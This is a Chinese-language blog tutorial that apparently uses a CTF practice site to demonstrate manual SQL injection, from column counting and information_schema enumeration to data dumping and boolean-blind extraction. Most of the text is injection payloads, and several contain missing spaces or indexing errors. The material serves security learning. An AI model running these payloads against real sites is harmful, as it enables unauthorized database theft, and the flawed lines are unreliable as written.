---
layout: default
---


SQL注入的原理就不在这里赘述了，直接从攻击技巧开始：

## 手工注入猜解流程 ##
假设我们现在以[http://ctf5.shiyanbar.com/8/index.php?id=1](http://ctf5.shiyanbar.com/8/index.php?id=1 "http://ctf5.shiyanbar.com/8/index.php?id=1")这个链接为例子，已知它的id是一个注入点：
我们可以大概知道它的SQL语句大概是这么写的：


    SELECT ID,CONTENT FROM TABLE WHERE ID=id

（1）得到字段总数：
我们通过order by语句来判断select所查询的字段数目：
payload为：

    id=1 order by 1/2/3/4

发现当使用order by 3的时候有报错回显，所以select 的字段一共是3个

（2）得到显示位：
在页面上会显示从select中选取的字段，我们接下来就是要判断显示的字段是哪几个字段
使用如下的payload(两者均可)进行判断。
payload为：

    id=-1 union select 1,2,3 或者id=1 and 1=2 union select 1,2,3

从中就可以判断到显示的是从select选出来的第几位和第几位的信息

（3）查询数据库信息：
在知道了显示位之后，那么接下来就可以通过显示位来显示我们想知道的信息，如数据库的版本，用户信息等等。那么我们使用如下的payload就可以知道相关的信息。
payload：

    id=-1 union select1,version(),database()

![](http://img.blog.csdn.net/20170111101223544?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

可以看到在页面上就出现了数据库的版本信息和当前使用的数据库信息。
类似的函数还有：
system_user()--数据库的系统用户
current_user()---当前登陆的数据库用户
last_insert_id()---最后一次插入操作的id
那么接下来我们通过这种方式知道数据库中所有的数据库的名称。

payload:

    id=-1 union select 1,2,SCHEMA_NAMEfrom information_schema.SCHEMATA limit 0,1 #得到第一个库名

payload:


    id=-1 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA limit 1,1 #得到第二个库名

或者是：

    id=-1 union select 1,2,group_concat(schema_name) from information_schema.SCHEMATA#

![数据库结果](http://img.blog.csdn.net/20170111100939384?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)
![这里写图片描述](http://img.blog.csdn.net/20170111101034916?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

这样我们可以知道存在有两个数据库，一般information_schema是第一个数据库，是系统自动生成的库

（4）查询表名：
由于database()返回的就是当前web程序所使用的数据库名，那么我们就利用database()来查询所有的表信息。当然在上一步中。我们也已经知道当前的database就是my_db.
payload:

    id=-1 union select 1,group_concat(table_name),3 from information_schema.tableswhere table_schema=database()

这样我们就得到当前数据库下所有的表名了。页面返回的结果是：

![这里写图片描述](http://img.blog.csdn.net/20170111101516654?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

即在当前数据库下存在两个表：news和thiskey

（5）查询列名：
在知道了表名之后，接下来我们利用information_schema.columns就可以根据表名来获取当前表中所有的字段。
payload：

    id=-1 union select 1,group_concat(column_name),3 from information_schema.columnswhere table_name='thiskey'

如果'被屏蔽：
payload：

    id=-1 unionselect 1,group_concat(column_name),3 from information_schema.columns where table_name=0x746869736b6579(thiskey的十六进制)

![这里写图片描述](http://img.blog.csdn.net/20170111102529831?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzQ4NDE4MjM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

可以知道有k0y列。但是有的时候后台的代码可能仅用了使用where子句，那么这个时候就无法通过information_schema.coumns来得到列名了，这个时候只能够根据你自己多年的黑客经验来进行猜解了。猜解的方法也是比较的简单，使用exists子句就可以进行猜解了。假设在我们已经知道了表名的情况下(当然猜解表名也使用通过exists子句来完成)

payload：

    id=1 and exists(selectk0y from thiskey)

主要的语句就是exists(select 需要猜解的列名 from users)这种句式。如果在users表中不存在uname列名，则页面不会显示内容或者是直接出现sql的错误语句。

(6)爆出字段内容
在知道了当前数据库所有的表名和字段名之后，接下来我们就可以dump数据库中所有的信息了。比如我们下载当前thiskey表中所有的数据。

payload：

    id=-1 union select 1,group_concat(k0y) from thiskey

这个是最乐观的状态
还有些情况需要一位一位的比较才能获取字段内容：（也就是sqlmap主要做的工作之一）

payload:

    id=1 and ascii(substring((select concat(k0y,0x3a) from thiskey limit 0,1),1,1))>64

意思为如果k0y第一条记录的第一位的ascii码>64则返回正常页面
又或者是

    id=1 and ascii(substring((select k0y from thiskey),0,1))=119

    id=1 and ascii(substring((select k0y from thiskey),0,1))>64

意思都是一样的
这样通过不断比较可以获得字段具体内容